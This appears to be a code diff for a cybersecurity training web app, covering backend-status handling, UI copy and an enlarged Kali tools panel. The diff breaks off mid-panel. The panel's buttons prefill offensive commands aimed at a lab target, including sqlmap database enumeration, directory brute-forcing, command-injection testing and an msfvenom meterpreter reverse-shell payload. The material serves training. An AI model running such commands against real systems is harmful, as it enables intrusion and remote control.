@@ -235,38 +235,52 @@ function toast(s) {
   toast.timer = setTimeout(() => $('#toast').classList.remove('show'), 3300);
 }
 
-// Check Backend Health and Sync Catalog
-async function checkBackend() {
-  try {
-    const res = await fetch(`${API_BASE}/api/health`);
-    if (res.ok) {
-      const data = await res.json();
-      isLiveApi = true;
-      const badge = $('#api-status-badge');
-      if (badge) {
-        badge.innerHTML = '<span class="pulse-beacon" style="background:#10b981;box-shadow:0 0 8px #10b981;"></span> LIVE API ACTIVE';
-        badge.style.color = '#10b981';
-        badge.style.borderColor = 'rgba(16, 185, 129, 0.4)';
-        badge.style.background = 'rgba(16, 185, 129, 0.1)';
-      }
-      const footer = $('#footer-status');
-      if (footer) footer.textContent = 'Connected to Cyber Lab Control Plane (Port 3001) · Real-time WebSocket Gateway Online';
+function setBackendStatus(connected) {
+  isLiveApi = connected;
+  const badge = $('#api-status-badge');
+  if (badge) {
+    badge.innerHTML = connected
+      ? '<span class="pulse-beacon" style="background:#10b981;box-shadow:0 0 8px #10b981;"></span> LIVE API ACTIVE'
+      : '<span class="pulse-beacon"></span> BACKEND OFFLINE';
+    badge.style.color = connected ? '#10b981' : '';
+    badge.style.borderColor = connected ? 'rgba(16, 185, 129, 0.4)' : '';
+    badge.style.background = connected ? 'rgba(16, 185, 129, 0.1)' : '';
+  }
+  const footer = $('#footer-status');
+  if (footer) footer.textContent = connected
+    ? 'Connected to Cyber Lab Control Plane'
+    : 'Backend unavailable · Launching a lab will retry the connection';
+}
 
-      // Fetch live catalog
-      const catalogRes = await fetch(`${API_BASE}/api/labs`);
-      if (catalogRes.ok) {
-        labs = await catalogRes.json();
-        renderCards();
-      }
-      syncProgress();
-    }
+// A catalog or rendering error must not change the backend's connection state.
+async function checkBackend({ syncCatalog = true } = {}) {
+  try {
+    const res = await fetch(`${API_BASE}/api/health`, {
+      cache: 'no-store', signal: AbortSignal.timeout(8000)
+    });
+    if (!res.ok || (await res.json()).status !== 'ok') throw new Error('Backend health check failed');
   } catch (e) {
-    isLiveApi = false;
-    const badge = $('#api-status-badge');
-    if (badge) {
-      badge.innerHTML = '<span class="pulse-beacon"></span> STANDALONE FORGE';
+    setBackendStatus(false);
+    return false;
+  }
+
+  setBackendStatus(true);
+  if (syncCatalog) {
+    try {
+      const catalogRes = await fetch(`${API_BASE}/api/labs`, {
+        cache: 'no-store', signal: AbortSignal.timeout(8000)
+      });
+      if (!catalogRes.ok) throw new Error('Lab catalog request failed');
+      const catalog = await catalogRes.json();
+      if (!Array.isArray(catalog)) throw new Error('Invalid lab catalog response');
+      labs = catalog;
+      renderCards();
+      await syncProgress();
+    } catch (e) {
+      console.warn('Lab catalog or progress could not refresh:', e);
     }
   }
+  return true;
 }
 
 const KEY_COMPLETED_HISTORY = 'rangeforge_completed_history';
@@ -362,35 +376,31 @@ function catalog() {
   $('#main').innerHTML = `
     <div class="pagehead">
       <div>
-        <div class="eyebrow">CYBER LAB PLATFORM</div>
-        <h1>Train. Attack. Defend.</h1>
-        <p>Real-world cybersecurity challenges. Your own isolated space to forge offensive and defensive mastery.</p>
+        <div class="eyebrow">YOUR TRAINING GROUND</div>
+        <h1>Find your next challenge.</h1>
+        <p>Build practical security skills, one hands-on lab at a time.</p>
       </div>
       <button class="secondary" id="open-sandbox"><span>＋</span> Quick practice</button>
     </div>
     <section class="feature">
       <div class="featurecopy">
-        <div class="eyebrow">↗ &nbsp; A GOOD PLACE TO START</div>
-        <h2>Get comfortable with the command line.</h2>
-        <p>Step into your first Linux lab. Explore the filesystem, learn essential commands, and capture your first flag.</p>
+        <div class="feature-label"><span></span> FEATURED ENVIRONMENT</div>
+        <h2>Your Kali lab.<br><em>Ready to explore.</em></h2>
+        <p>A dedicated Kali Linux Rolling workspace with the essential security toolkit. Open a terminal and put your skills to work.</p>
+        <div class="feature-specs"><span>4 vCPU</span><span>3.5 GB RAM</span><span>Kali Rolling</span></div>
         <div class="featureactions">
-          <button class="primary" data-launch="linux">Start Linux fundamentals <span>↗</span></button>
-          <span>30 min · Beginner friendly</span>
+          <button class="primary" data-launch="kali-sandbox">Launch Kali lab <span>↗</span></button>
+          <button class="feature-secondary" data-launch="linux">Start with Linux basics <span>→</span></button>
         </div>
       </div>
-      <div class="network" aria-label="Your workstation connects to an isolated lab target">
-        <div class="node">
-          <span class="glyph">▣</span>
-          <strong>Your workstation</strong>
-          <small>10.10.0.2</small>
+      <div class="workspace-art" aria-hidden="true">
+        <div class="art-orbit art-orbit-one"></div><div class="art-orbit art-orbit-two"></div>
+        <div class="art-platform art-platform-back"></div><div class="art-platform art-platform-front"></div>
+        <div class="art-terminal">
+          <div class="art-terminal-bar"><span><i></i><i></i><i></i></span><small>kali / workspace</small><b>⌘</b></div>
+          <div class="art-terminal-content"><span class="art-prompt">~ / ready to build</span><strong>&gt;_</strong><div class="art-code-line"></div><div class="art-code-line short"></div><p>KALI LINUX <span>ROLLING</span></p></div>
         </div>
-        <div class="netline"></div>
-        <div class="node target">
-          <span class="glyph">▤</span>
-          <strong>Lab target</strong>
-          <small>10.10.0.10</small>
-        </div>
-        <div class="netfoot">⌑ &nbsp; CYBER LAB ISOLATED ENVIRONMENT</div>
+        <div class="art-floating-tag"><span>⌁</span> Your isolated workspace</div>
       </div>
     </section>
     <div class="catalogbar">
@@ -404,7 +414,7 @@ function catalog() {
     </div>
     <div class="catalogmeta">
       <span id="result-count"></span>
-      <span>Kali Linux & Ubuntu environments</span>
+      <span>Choose a challenge. Make progress.</span>
     </div>
     <div class="cards" id="cards"></div>
   `;
@@ -419,12 +429,13 @@ function catalog() {
 function renderCards() {
   const catBadge = $('#catalog-badge');
   if (catBadge) catBadge.textContent = String(labs.length).padStart(2, '0');
+  if (!$('#cards') || !$('#result-count')) return;
   const result = labs.filter(l => (filter === 'All labs' || l.level === filter) && `${l.name} ${l.category} ${l.tags.join(' ')} ${l.os}`.toLowerCase().includes(query.toLowerCase()));
   $('#result-count').textContent = `${result.length} ${result.length === 1 ? 'lab' : 'labs'} to explore`;
   $('#cards').innerHTML = result.length ? result.map(l => `
-    <article class="card">
+    <article class="card ${l.id === 'kali-sandbox' ? 'card-kali' : ''}">
       <div class="cardtop">
-        <div class="labicon ${l.color}">${l.icon}</div>
+        <div class="labicon ${l.color}" aria-hidden="true">${l.id === 'kali-sandbox' ? '>_' : l.icon}</div>
         <span class="level ${l.level === 'Intermediate' ? 'medium' : l.level === 'Advanced' ? 'hard' : ''}">${l.level}</span>
       </div>
       <div class="category">${l.category}</div>
@@ -474,6 +485,8 @@ $('#confirm-launch').onclick = async () => {
   $('#confirm-launch').disabled = true;
   $('#confirm-launch').textContent = 'Provisioning isolated container…';
 
+  // Retry after a failed startup check and wait if the user launches immediately.
+  await checkBackend({ syncCatalog: false });
   if (isLiveApi) {
     try {
       const res = await fetch(`${API_BASE}/api/sessions`, {
@@ -505,13 +518,24 @@ $('#confirm-launch').onclick = async () => {
       $('#confirm-launch').disabled = false;
       $('#confirm-launch').innerHTML = 'Launch session <span>↗</span>';
       $('#session-dot').style.display = 'block';
-      tab = (selected && (selected.os === 'Kali Linux' || selected.id === 'kali-sandbox')) ? 'Desktop' : 'Terminal';
+      tab = 'Terminal';
       navigate('session');
       toast('Live environment provisioned and ready.');
       return;
     } catch (e) {
-      console.warn('Live API session creation failed, falling back to local simulation:', e);
+      console.error('Live lab provisioning failed:', e);
+      toast(e.message || 'Unable to start Kali. Check Docker and the full Kali image build.');
+      $('#confirm-launch').disabled = false;
+      $('#confirm-launch').innerHTML = 'Launch session <span>↗</span>';
+      return;
     }
+  }
+
+  if (selected.id === 'kali-sandbox') {
+    toast('The full Kali lab requires the live backend and Docker. Start the server and try again.');
+    $('#confirm-launch').disabled = false;
+    $('#confirm-launch').innerHTML = 'Launch session <span>↗</span>';
+    return;
   }
 
   // Local Simulation Fallback
@@ -1068,10 +1092,10 @@ async function renderSessionHub() {
   $('#main').innerHTML = `
     <div class="pagehead" style="margin-bottom: 24px;">
       <div>
-        <div class="eyebrow">YOUR WORKSPACE &bull; SESSION HUB</div>
-        <h1 style="margin-top: 4px;">My Sessions & Command History</h1>
+        <div class="eyebrow">YOUR WORKSPACE</div>
+        <h1 style="margin-top: 4px;">Pick up where you left off.</h1>
         <p style="color: var(--text-secondary); max-width: 680px; margin-top: 6px; font-size: 14.5px;">
-          Review all your active and previous sandbox environments, view executed command history, inspect captured flags, and monitor isolated container telemetry.
+          Your lab sessions, saved commands, and captured flags, together in one place.
         </p>
       </div>
       <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
@@ -1115,7 +1139,7 @@ async function renderSessionHub() {
           ⌨ Command History (${totalCmds})
         </button>
         <button class="session-hub-tab ${currentHubTab === 'telemetry' ? 'active' : ''}" data-hub-tab="telemetry">
-          🌐 Isolated Subnet & Telemetry
+          ⌁ Network reference
         </button>
       </div>
 
@@ -1359,7 +1383,7 @@ function renderHubTelemetry(container) {
           </div>
           <div style="font-family:var(--font-mono); font-size:18px; font-weight:700; color:#fff; margin-top:4px;">10.10.0.2</div>
           <div style="font-size:12px; color:var(--text-secondary); margin-top:4px;">
-            Kali Linux 2024.1 Rolling &bull; 2 vCPU &bull; 4GB RAM
+            Kali Linux Rolling &bull; 4 vCPU &bull; 3.5 GB RAM
           </div>
           <div style="font-size:11.5px; color:var(--text-muted); margin-top:8px; font-family:var(--font-mono);">
             Hostname: kali.lab &bull; Gateway: 10.10.0.1
@@ -1418,7 +1442,7 @@ function renderHubTelemetry(container) {
           </div>
           <div>
             <span style="color:var(--text-muted); display:block; margin-bottom:2px;">Compute Allocation</span>
-            <strong style="color:#fff; font-family:var(--font-mono);">2.0 vCPU &bull; 4,096 MB RAM</strong>
+            <strong style="color:#fff; font-family:var(--font-mono);">4 vCPU &bull; 3.5 GB RAM</strong>
           </div>
           <div>
             <span style="color:var(--text-muted); display:block; margin-bottom:2px;">Network Mode</span>
@@ -1516,7 +1540,7 @@ function workspace() {
         </section>
         <div class="statusstrip">
           <span>⌑ Subnet: 10.10.0.0/24 · Workstation: 10.10.0.2</span>
-          <span>${isLiveApi ? 'Ephemeral Container · 2 vCPU · 4 GB RAM' : '2 vCPU · 4 GB RAM'}</span>
+          <span>${isLiveApi ? 'Ephemeral Container · 4 vCPU · 3.5 GB RAM' : '4 vCPU · 3.5 GB RAM'}</span>
         </div>
         <div class="session-drawer" id="session-drawer">
           <button class="session-drawer-toggle" id="session-drawer-toggle" type="button" aria-expanded="false">
@@ -1850,7 +1874,7 @@ function renderKaliDesktop(container) {
           </div>
           <div class="kali-watermark-title">KALI LINUX</div>
           <div class="kali-watermark-sub">The quieter you become, the more you are able to hear.</div>
-          <div class="kali-watermark-release">Kali GNU/Linux Rolling 2024.1 · 6.6.15-amd64 · XFCE Desktop</div>
+          <div class="kali-watermark-release">Kali Linux Rolling · Desktop preview · Use Terminal for the live shell</div>
         </div>
 
         <!-- Desktop Icons Grid (Left Column) -->
@@ -1982,10 +2006,10 @@ function renderKaliDesktop(container) {
         </div>
 
         <!-- 3. Kali Offensive Tools Suite Window -->
-        <div class="kali-window" id="kali-win-tools" style="top:40px; left:160px; width:560px; height:380px; max-width:calc(100% - 170px); max-height:calc(100% - 50px); display:${wsState.tools ? 'flex' : 'none'};">
+        <div class="kali-window" id="kali-win-tools" style="top:35px; left:130px; width:720px; height:500px; max-width:calc(100% - 140px); max-height:calc(100% - 45px); display:${wsState.tools ? 'flex' : 'none'};">
           <div class="kali-window-header" id="kali-win-tools-header">
             <div class="kali-window-title">
-              <span style="color:#00f0ff;">⚔️</span> Kali Linux Offensive Security Tools
+              <span style="color:#00f0ff;">⚔️</span> Kali Linux Offensive Security Tools (90+ Tools Available)
             </div>
             <div class="kali-window-btns">
               <button class="kali-win-btn kali-win-min" id="kali-win-tools-min" title="Minimize"></button>
@@ -1993,50 +2017,278 @@ function renderKaliDesktop(container) {
               <button class="kali-win-btn kali-win-close" id="kali-win-tools-close" title="Close"></button>
             </div>
           </div>
-          <div style="background:#131c26; padding:6px 10px; border-bottom:1px solid rgba(255,255,255,0.08);">
-            <input type="text" id="kali-tools-search" placeholder="Search offensive tools (nmap, sqlmap, hydra, metasploit)..." style="width:100%; background:rgba(0,0,0,0.4); border:1px solid rgba(0,240,255,0.25); border-radius:4px; padding:4px 8px; color:#fff; font-size:11px; outline:none;">
+          <div style="background:#131c26; padding:8px 12px; border-bottom:1px solid rgba(255,255,255,0.08); display:flex; flex-direction:column; gap:6px;">
+            <input type="text" id="kali-tools-search" placeholder="Search 90+ Kali tools (nmap, sqlmap, hydra, metasploit, wireshark, aircrack)..." style="width:100%; background:rgba(0,0,0,0.4); border:1px solid rgba(0,240,255,0.25); border-radius:4px; padding:6px 10px; color:#fff; font-size:11px; outline:none;">
+            <div style="display:flex; gap:6px; flex-wrap:wrap; font-size:10px;" id="kali-tool-filter-tags">
+              <button class="kali-filter-btn active" data-cat="all" style="padding:3px 8px; border-radius:3px; background:rgba(0,240,255,0.2); border:1px solid rgba(0,240,255,0.4); color:#00f0ff; cursor:pointer;">All Tools</button>
+              <button class="kali-filter-btn" data-cat="recon" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Recon & OSINT</button>
+              <button class="kali-filter-btn" data-cat="web" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Web Apps</button>
+              <button class="kali-filter-btn" data-cat="exploit" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Exploitation</button>
+              <button class="kali-filter-btn" data-cat="passwords" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Passwords</button>
+              <button class="kali-filter-btn" data-cat="wireless" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Wireless</button>
+              <button class="kali-filter-btn" data-cat="sniffing" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Sniffing</button>
+              <button class="kali-filter-btn" data-cat="forensics" style="padding:3px 8px; border-radius:3px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#7e95a9; cursor:pointer;">Reverse & Forensics</button>
+            </div>
           </div>
           <div class="kali-window-body" style="padding:12px; overflow-y:auto;" id="kali-tools-cards-container">
-            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">📡 Nmap v7.94</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Network discovery and vulnerability scanning.</div>
-                <button class="tool-quick-run" data-cmd="nmap 10.10.0.10" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run nmap</button>
+            <div style="display:grid; grid-template-columns:repeat(auto-fill, minmax(210px, 1fr)); gap:10px;">
+              <!-- 1. Recon -->
+              <div class="kali-tool-card" data-cat="recon" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📡 Nmap v7.94</span>
+                  <span style="font-size:9px; background:rgba(0,240,255,0.15); color:#00f0ff; padding:1px 5px; border-radius:3px;">RECON</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Network discovery & port vulnerability scanner.</div>
+                <button class="tool-quick-run" data-cmd="nmap -sV -sC 10.10.0.10" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run nmap</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">💉 SQLmap v1.8</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Automatic SQL injection and database takeover.</div>
-                <button class="tool-quick-run" data-cmd="sqlmap -u http://10.10.0.10:8080/ --batch" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run sqlmap</button>
+
+              <div class="kali-tool-card" data-cat="recon" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">⚡ Masscan v1.3</span>
+                  <span style="font-size:9px; background:rgba(0,240,255,0.15); color:#00f0ff; padding:1px 5px; border-radius:3px;">RECON</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Ultra-fast asynchronous TCP port scanner.</div>
+                <button class="tool-quick-run" data-cmd="masscan -p1-65535 10.10.0.10 --rate=1000" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run masscan</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">🔓 Hydra v9.5</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast network login password cracker.</div>
-                <button class="tool-quick-run" data-cmd="hydra -l admin -P wordlists 10.10.0.10 ssh" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run hydra</button>
+
+              <div class="kali-tool-card" data-cat="recon" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🔍 Netdiscover</span>
+                  <span style="font-size:9px; background:rgba(0,240,255,0.15); color:#00f0ff; padding:1px 5px; border-radius:3px;">RECON</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Active/passive ARP network subnet scanner.</div>
+                <button class="tool-quick-run" data-cmd="netdiscover -r 10.10.0.0/24" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run netdiscover</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">💣 Metasploit</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Penetration testing system & exploit DB.</div>
-                <button class="tool-quick-run" data-cmd="msfconsole" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run msfconsole</button>
+
+              <div class="kali-tool-card" data-cat="recon" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🌐 WhatWeb v0.5</span>
+                  <span style="font-size:9px; background:rgba(0,240,255,0.15); color:#00f0ff; padding:1px 5px; border-radius:3px;">RECON</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Next generation web application fingerprinting.</div>
+                <button class="tool-quick-run" data-cmd="whatweb http://10.10.0.10:8080/" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run whatweb</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">🦈 Tcpdump / Wireshark</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Network packet capture and protocol analyzer.</div>
-                <button class="tool-quick-run" data-cmd="tcpdump -i eth0 -c 10" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run tcpdump</button>
+
+              <div class="kali-tool-card" data-cat="recon" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🦅 theHarvester</span>
+                  <span style="font-size:9px; background:rgba(0,240,255,0.15); color:#00f0ff; padding:1px 5px; border-radius:3px;">OSINT</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">E-mail, subdomains, and names harvester.</div>
+                <button class="tool-quick-run" data-cmd="theharvester -d cyberlab.io -b google" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run theharvester</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">🛡️ Nikto v2.5</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Web server vulnerability scanner.</div>
+
+              <!-- 2. Web App -->
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">💉 SQLmap v1.8</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Automatic SQL injection & database takeover.</div>
+                <button class="tool-quick-run" data-cmd="sqlmap -u http://10.10.0.10:8080/ --dbs --batch" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run sqlmap</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🛡️ Nikto v2.5</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Web server vulnerability and misconfig scanner.</div>
                 <button class="tool-quick-run" data-cmd="nikto -h 10.10.0.10:8080" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run nikto</button>
               </div>
-              <div class="kali-tool-card" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
-                <div style="color:#00f0ff; font-weight:600; font-size:12px;">🔑 John the Ripper</div>
-                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast offline password and hash cracker.</div>
+
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📁 Gobuster v3.6</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast directory, DNS, and vhost brute-forcer.</div>
+                <button class="tool-quick-run" data-cmd="gobuster dir -u http://10.10.0.10:8080/ -w /root/wordlists" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run gobuster</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">🔎 Dirb v2.22</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Raw HTTP dictionary based web cracker.</div>
+                <button class="tool-quick-run" data-cmd="dirb http://10.10.0.10:8080/" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run dirb</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">⚡ Ffuf v2.1</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Fast web fuzzer written in Go.</div>
+                <button class="tool-quick-run" data-cmd="ffuf -u http://10.10.0.10:8080/FUZZ -w /root/wordlists" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run ffuf</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="web" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">💥 Commix v3.8</span>
+                  <span style="font-size:9px; background:rgba(255,100,100,0.2); color:#ff6b6b; padding:1px 5px; border-radius:3px;">WEB</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Automated command injection detector & exploit.</div>
+                <button class="tool-quick-run" data-cmd="commix --url=http://10.10.0.10:8080/" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run commix</button>
+              </div>
+
+              <!-- 3. Exploitation -->
+              <div class="kali-tool-card" data-cat="exploit" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">💣 Metasploit</span>
+                  <span style="font-size:9px; background:rgba(255,150,50,0.2); color:#ff9f43; padding:1px 5px; border-radius:3px;">EXPLOIT</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Industry-standard penetration testing platform.</div>
+                <button class="tool-quick-run" data-cmd="msfconsole" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run msfconsole</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="exploit" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📦 Msfvenom</span>
+                  <span style="font-size:9px; background:rgba(255,150,50,0.2); color:#ff9f43; padding:1px 5px; border-radius:3px;">PAYLOADS</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Standalone payload generator & shellcode encoder.</div>
+                <button class="tool-quick-run" data-cmd="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.0.2 LPORT=4444 -f elf" style="padding:3px 8px; font-size:10px; background:rgba(0,240,255,0.15); border:1px solid rgba(0,240,255,0.3); color:#00f0ff; border-radius:3px; cursor:pointer;">Run msfvenom</button>
+              </div>
+
+              <div class="kali-tool-card" data-cat="exploit" style="background:rgba(255,255,255,0.03); border:1px solid rgba(0,240,255,0.15); padding:10px; border-radius:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:#00f0ff; font-weight:600; font-size:12px;">📜 Searchsploit</span>
+                  <span style="font-size:9px; background:rgba(255,150,50,0.2); color:#ff9f43; padding:1px 5px; border-radius:3px;">EXPLOIT</span>
+                </div>
+                <div style="color:#7e95a9; font-size:11px; margin:4px 0 8px;">Command line archive of Exploit-DB exploits.</div>
